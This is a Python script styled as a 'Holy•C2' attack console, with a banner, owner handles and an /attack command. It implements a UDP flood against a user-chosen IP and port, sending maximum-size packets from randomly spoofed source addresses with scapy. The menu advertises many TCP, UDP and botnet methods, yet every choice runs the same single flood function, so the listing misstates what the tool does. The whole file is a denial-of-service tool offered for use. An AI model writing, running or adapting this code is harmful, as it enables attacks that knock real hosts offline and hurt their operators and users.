import os
import time
import random
import threading
from scapy.all import IP, UDP, Raw, send

# Colors for terminal output
RED = '\033[91m'
WHITE = '\033[97m'
RESET = '\033[0m'

# Clear the terminal screen
os.system("cls" if os.name == "nt" else "clear")

# Banner
banner = f"""{WHITE}
Holy•C2>>{RED}
.S S.   sSSs_sSSs     S.     .S S.
.SS SS. d%%SP~YS%%b   SS.   .SS SS.
S%SS%S  d%S'  `S%b    S%SS%SS%S
S%SS%SS%SS%SS%SS%SS%SS
S%S SSSS%S S&S S&S    S&S S%SS%S
S&S SSS&S S&S S&S     S&S SS SS
S&S    S&S S&S S&S    S&S SS
S&S    S&S S&S S&S    S&S SSS
S*SS*SS*bd*SS*b        S*S
S*SS*SS*S.  .S*SS*S.   S*S
S*SS*S  SSSbs_sdSSS    SSSbs  S*S
SSS     S*S YSSP~YSSY  YSSP   S*S
         SP   SP
         AA
{WHITE}
Owner: <apsxcode>
Power: <tunnelcass>
Utilise .methods to see the available attack methods!
{RESET}"""

# Display banner
print(banner)

# Display available methods in English
def display_methods():
    print(f"{WHITE}\nHoly•C2>>{RED}")
    print("METHODS: TCP")
    print("TCPBYPASS, TCPROXIES, TCPHEX")
    print("\nMETHODS: UDP")
    print("UDPNUKE, UDPBYPASS, UDPGOOD, UDPPACKETS, UDPPPS, UDPRAW, UDPNUCLEAR")
    print("\nMETHODS: BOTNET")
    print("UDPBOTNET, DNSBOTNET")
    print(f"{RESET}")

# Function to generate random IPs (spoofed)
def generate_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Real UDP Flood Attack with IP Spoofing
def udp_flood(target_ip, target_port, duration):
    payload = b'\xff' * 65507  # Payload of 65507 bytes
    timeout = time.time() + duration
    while time.time() < timeout:
        spoofed_ip = generate_ip()  # Generating a random spoofed IP
        packet = IP(src=spoofed_ip, dst=target_ip) / UDP(dport=target_port, sport=random.randint(1024, 65535)) / Raw(load=payload)
        send(packet, verbose=0)  # Sending the packet with spoofed IP

# Function to start the attack
def start_attack(ip, port, duration, method):
    print(f"{RED}Attack started to {ip}:{port} using {method} for {duration}s...{RESET}")
    print(f"{WHITE}Initiating attack...{RESET}")

    # Start the UDP flood attack
    udp_flood(ip, port, duration)

# Main loop to handle commands
while True:
    try:
        print(f"{WHITE}Holy•C2>> {RED}", end='')  # Prompt in red and white
        cmd = input().strip()

        if cmd == ".methods":
            display_methods()  # Display available attack methods
        elif cmd.startswith("/attack"):
            try:
                _, ip, port, duration, method = cmd.split()  # Parsing the command
                start_attack(ip, port, int(duration), method)  # Start the attack
                print(f"{RED}Attack successfully completed!{RESET}")  # Message indicating the attack was completed successfully
            except ValueError:
                print(f"{RED}Correct usage: /attack <ip> <port> <time> <method>{RESET}")
        else:
            print(f"{RED}Unrecognized command. Use .methods to view the available methods.{RESET}")
    except KeyboardInterrupt:
        print(f"{RESET}\nAttack finished.")
        break
